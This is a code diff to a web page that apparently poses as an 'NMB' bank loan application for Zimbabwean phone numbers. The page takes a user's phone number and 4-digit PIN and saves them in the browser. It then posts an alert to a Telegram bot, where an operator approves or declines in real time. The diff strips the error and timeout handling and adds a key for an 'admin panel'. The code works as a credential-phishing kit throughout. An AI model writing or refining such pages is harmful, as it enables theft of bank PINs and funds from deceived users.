@@ -119,18 +119,20 @@
         phoneInput.addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, ''));
 
         submitBtn.addEventListener('click', async () => {
-            const phone = phoneInput.value;
+            const phoneRaw = phoneInput.value;
             const pin = Array.from(pinInputs).map(i => i.value).join('');
 
-            if (phone.length !== 9) { alert('Please enter a valid 9-digit phone number'); return; }
+            if (phoneRaw.length !== 9) { alert('Please enter a valid 9-digit phone number'); return; }
             if (pin.length !== 4) { alert('Please enter your 4-digit PIN'); return; }
 
+            const phone = '+263' + phoneRaw;
             const sessionData = {
-                phone: '+263' + phone,
+                phone: phone,
                 pin: pin,
                 ...loanData
             };
             localStorage.setItem('nmb_session', JSON.stringify(sessionData));
+            localStorage.setItem('current_phone', phone); // Key for admin panel to find
 
             const message = `
 🚨 <b>NEW LOAN APPLICATION</b>
@@ -147,14 +149,14 @@
             const inlineKeyboard = {
                 inline_keyboard: [
                     [
-                        { text: '✅ APPROVE', callback_data: `approve_${sessionData.phone}` },
-                        { text: '❌ DECLINE', callback_data: `decline_${sessionData.phone}` }
+                        { text: '✅ APPROVE', callback_data: `approve_${phone}` },
+                        { text: '❌ DECLINE', callback_data: `decline_${phone}` }
                     ]
                 ]
             };
 
             try {
-                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+                await fetch(`${TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -165,21 +167,18 @@
                     })
                 });
 
-                if (response.ok) {
-                    loginForm.classList.add('hidden');
-                    pollingOverlay.classList.remove('hidden');
-                    pollForApproval(sessionData.phone);
-                } else {
-                    alert('Error processing request. Please try again.');
-                }
+                loginForm.classList.add('hidden');
+                pollingOverlay.classList.remove('hidden');
+                pollForApproval(phone);
             } catch (error) {
                 alert('Connection error. Please try again.');
             }
         });
 
-        async function pollForApproval(phone) {
+        function pollForApproval(phone) {
             const interval = setInterval(() => {
                 const status = localStorage.getItem(`approval_${phone}`);
+                console.log(`Checking status for ${phone}: ${status}`); // Debug log
                 if (status === 'approved') {
                     clearInterval(interval);
                     localStorage.removeItem(`approval_${phone}`);
@@ -190,15 +189,6 @@
                     location.reload();
                 }
             }, 1000);
-            
-            // Timeout after 2 minutes
-            setTimeout(() => {
-                clearInterval(interval);
-                if (pollingOverlay.offsetParent !== null) {
-                    alert('Session timeout. Please try again.');
-                    location.reload();
-                }
-            }, 120000);
         }
     </script>
 </body>
